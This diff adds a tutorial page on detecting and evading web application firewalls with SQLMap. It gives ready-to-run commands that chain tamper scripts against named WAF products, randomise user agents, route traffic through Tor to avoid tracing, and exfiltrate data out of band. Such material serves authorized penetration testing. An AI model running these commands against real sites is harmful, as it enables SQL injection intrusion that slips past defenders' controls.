@@ -1,0 +1,148 @@
+---
+title: WAF Detection and Bypass
+description: Learn how to detect and bypass Web Application Firewalls using SQLMap
+---
+
+# WAF Detection and Bypass
+
+Web Application Firewalls (WAFs) are security systems designed to protect web applications from various attacks, including SQL injection. SQLMap includes features to detect and bypass WAFs during authorized security testing.
+
+## Detecting WAFs
+
+### Automatic WAF Detection
+
+SQLMap can automatically detect the presence of a WAF:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --identify-waf
+```
+
+This attempts to identify if a WAF is protecting the target application and, if possible, determine which specific WAF product is in use.
+
+### Detailed WAF Fingerprinting
+
+For more detailed WAF fingerprinting:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --fingerprint
+```
+
+This performs a more comprehensive fingerprinting of the target, including WAF detection.
+
+## Common WAF Bypass Techniques
+
+### Level and Risk Adjustment
+
+Increasing the test level and risk can help bypass some WAFs:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --level=5 --risk=3
+```
+
+Higher levels and risks use more sophisticated techniques that might evade WAF detection.
+
+### Tamper Scripts
+
+SQLMap's tamper scripts modify payloads to bypass WAF filters:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=space2comment,between
+```
+
+This example uses two tamper scripts:
+- `space2comment`: Replaces spaces with comments
+- `between`: Replaces greater-than and less-than operators with BETWEEN statements
+
+### Chaining Multiple Tamper Scripts
+
+You can chain multiple tamper scripts for more effective evasion:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=space2comment,between,charencode,randomcase
+```
+
+The scripts are applied in the specified order, creating a more heavily obfuscated payload.
+
+## WAF-Specific Bypass Techniques
+
+### ModSecurity Bypass
+
+For ModSecurity WAF:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=modsecurityversioned,space2comment,charunicodeencode
+```
+
+### Cloudflare Bypass
+
+For Cloudflare WAF:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=cloudflare,randomcase,charencode
+```
+
+### F5 BIG-IP ASM Bypass
+
+For F5 BIG-IP Application Security Manager:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --tamper=between,charunicodeencode,space2randomblank
+```
+
+## Advanced Evasion Settings
+
+### Custom User-Agent
+
+Using a legitimate-looking user agent:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+```
+
+### Random User-Agent
+
+Using a random user agent for each request:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --random-agent
+```
+
+### Request Delays
+
+Adding delays between requests to avoid rate limiting:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --delay=2 --timeout=30
+```
+
+This adds a 2-second delay between requests and sets a 30-second timeout.
+
+### Tor Network Routing
+
+Routing requests through the Tor network:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --tor --tor-type=SOCKS5
+```
+
+This routes all SQLMap traffic through the Tor network, making it harder to trace.
+
+<Note title="Ethical and Legal Warning">
+WAF bypass techniques should only be used in authorized security testing scenarios. Unauthorized attempts to bypass security controls are illegal and unethical.
+</Note>
+
+## Troubleshooting WAF Bypasses
+
+If you're having trouble bypassing a WAF:
+
+1. Try different combinations of tamper scripts
+2. Use verbose mode (`-v`) to see what's happening
+3. Try different injection techniques with `--technique`
+4. Use time-based blind techniques which may be harder for WAFs to detect
+5. Consider using out-of-band techniques with `--dns-domain`
+
+Remember that WAF evasion success depends on:
+- The specific WAF product and its configuration
+- The WAF's rule set and update status
+- The specific SQL injection vulnerability
+- The database management system in use
